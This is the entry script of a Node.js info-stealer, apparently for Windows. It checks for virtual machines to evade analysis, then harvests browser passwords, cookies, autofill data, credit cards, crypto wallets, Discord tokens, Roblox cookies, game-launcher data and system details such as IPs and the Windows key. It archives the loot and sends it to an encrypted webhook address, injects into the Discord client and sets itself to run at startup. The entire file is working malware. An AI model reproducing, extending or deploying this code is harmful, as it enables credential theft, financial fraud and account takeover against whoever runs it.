// process.removeAllListeners("warning");
const Constants = require("./config/constants");
const VM = require("./util/VM");
const Browsers = require("./util/Browsers");
const Webhook = require("./util/Webhook");
const Discord = require("./util/Discord");
const PCInfo = require("./util/PCInfo");
const Embed = require("./globals/Embed");
const tmp = require("./util/tmp");
const config = require("./config/config");
const { setTimeout: sleep } = require("node:timers/promises");
const crypto = require("node:crypto");
const path = require("node:path");
const fs = require("fs-extra");
const { dump: yaml } = require("js-yaml");
const tar = require("tar");

const Games = require("./util/Games");
const DiscordUser = require("./util/DiscordUser");
const Util = require("./util/Util");
const checkInternet = require("node:dns")
  .promises.lookup("discord.com")
  .then(() => true)
  .catch(() => false);

const handlePromiseReject = async (p) => {
  try {
    await p;
  } catch (e) {
    Util.report(e);
  }
};

process
  .on("uncaughtException", async (_, p) => handlePromiseReject(p))
  .on("uncaughtException", (err) => {
    Util.report(err);
    exit(true);
  })
  .on("warning", (warn) => Util.report(warn));

(async function () {
  process.stdout.write("\n");

  const isVM = await VM.check().catch(Util.report);

  if (isVM === true) return exit();

  if (!checkInternet) exit(true, "No internet access...");

  const webhook = new Webhook(
    config.domain + "/s/" + AESDecrypt(config.f, config.pk)
  );

  if (!webhook) return exit(true);

  try {
    const tempDir = path.resolve(tmp.dir, "data");
    await fs.ensureDir(tempDir);

    const saveFile = async (dname, data) =>
      await fs
        .writeFile(
          path.join(tempDir, `${dname}.yaml`),
          yaml(data, { skipInvalid: true })
        )
        .catch(Util.report);

    const passwords = await Browsers.passwords().catch(Util.report);
    const cookies = await Browsers.cookies().catch(Util.report);
    const { autofill, cards, cardCount } = await Browsers.webdata().catch((e) =>
      Util.report(e, {})
    );
    const wallets = await Browsers.wallets(tempDir);
    const tokens = await Discord.tokens().catch((e) => Util.report(e, []));
    const pcinfo = await PCInfo.fetch();

    const epicgames = await Games.epicgames(tempDir).catch(Util.report);
    const minecraft = await Games.minecraft(tempDir).catch(Util.report);
    const steam = await Games.steam(tempDir).catch(Util.report);

    const roblox = Browsers.findCookie(
      ".roblox.com",
      ".ROBLOSECURITY",
      cookies.cookies
    );

    await saveFile("passwords", passwords.passwords);
    await saveFile("cookies", cookies?.cookies);
    await saveFile("autofill", autofill);
    await saveFile("cards", cards);
    await saveFile("discord", tokens);
    await saveFile("system", pcinfo);

    const tempFile = tmp.file();
    await tar.c(
      {
        file: tempFile,
        gzip: true,
        cwd: tmp.dir
      },
      ["data"]
    );

    const fileMessage = await webhook.send({
      file: {
        content: new Blob([fs.readFileSync(tempFile)]),
        name: "data.tgz"
      }
    });

    const summaryEmbed = new Embed()
      .setTitle("💸 Summary")
      .setThumbnail(Constants.INFO_ICON)
      .setDescription(
        Util.generateSummary({
          passwords,
          cookies,
          cardCount,
          wallets,
          tokens,
          roblox,
          epicgames,
          minecraft,
          steam
        }) +
          `\n\n➤ [Download](${
            Array.isArray(fileMessage?.attachments)
              ? fileMessage.attachments[0].url
              : "http://www.staggeringbeauty.com/"
          })`
      )
      .setTimestamp();

    const pcinfoEmbed = new Embed()
      .setTitle(`🖥️ PC Info (${pcinfo.username})`)
      .addField("HWID", pcinfo.hwid || "Not found")
      .addField("Manufacturer", pcinfo.manufacturer, true)
      .addField("Serial", pcinfo.serial, true)
      .addField("RAM", pcinfo.ram, true)
      .addField("Public IP", pcinfo.ip, true)
      .addField("Private IP", pcinfo.localIp, true)
      .addField("Model", pcinfo.model, true)
      .addField("Windows Key", pcinfo.pkey || "Not found", true)
      .addField("Disk", PCInfo.bytesToGB(pcinfo.allspace), true)
      .addField("Free Disk", PCInfo.bytesToGB(pcinfo.freespace), true);

    await webhook.send({ embeds: [summaryEmbed, pcinfoEmbed] });

    for (const token of tokens) {
      try {
        const user = await DiscordUser.fetch(token.token);

        if (!user) continue;

        const embeds = DiscordUser.generateEmbeds(user, token.source);

        await webhook.send({ embeds: embeds });

        await sleep(500);
      } catch (e) {
        Util.report(e);
        continue;
      }
    }

    for (const cookie of roblox) {
      const user = await Util.fetchRoblox(cookie).catch(Util.report);

      if (!user) continue;

      const embed = new Embed()
        .setTitle("🤖 Roblox Account")
        .setThumbnail(user.avatar)
        .setDescription("```" + cookie + "```")
        .addField("Username", user.username, true)
        .addField("Robux", user.robux + "⏣", true)
        .addField("ID", user.id, true)
        .addField("Premium", user.premium ? "✅" : "❌", true)
        .addField("Verified", user.verified ? "✅" : "❌", true)
        .addField(
          "Builder Club",
          user.builderClub ? user.builderClub : "❌",
          true
        )
        .addField("Friends", user.friends, true)
        .addField("Created At", user.created, true);

      await webhook.send({ embeds: [embed] });
    }
  } catch (e) {
    Util.report(e);
  }

  Util.cleanup();

  await Discord.inject().catch(Util.report);

  PCInfo.addToStartup();

  exit();
})();

function exit(failed, reason) {
  if (failed)
    console.log(`${reason ? reason : "Failed"}, exiting in 3 seconds...`);
  else console.log("Done, exiting in 3 seconds...");

  return sleep(3000).then(() => process.exit(failed ? 1 : 0));
}

function AESDecrypt(data, key) {
  const [ivHex, encrypted] = data.split(":");
  const iv = Buffer.from(ivHex, "hex");
  const salt = crypto.scryptSync(key, "salt", 32);
  const decipher = crypto.createDecipheriv("aes-256-cbc", salt, iv);
  let decrypted = decipher.update(encrypted, "hex", "utf8");
  decrypted += decipher.final("utf8");
  return decrypted;
}
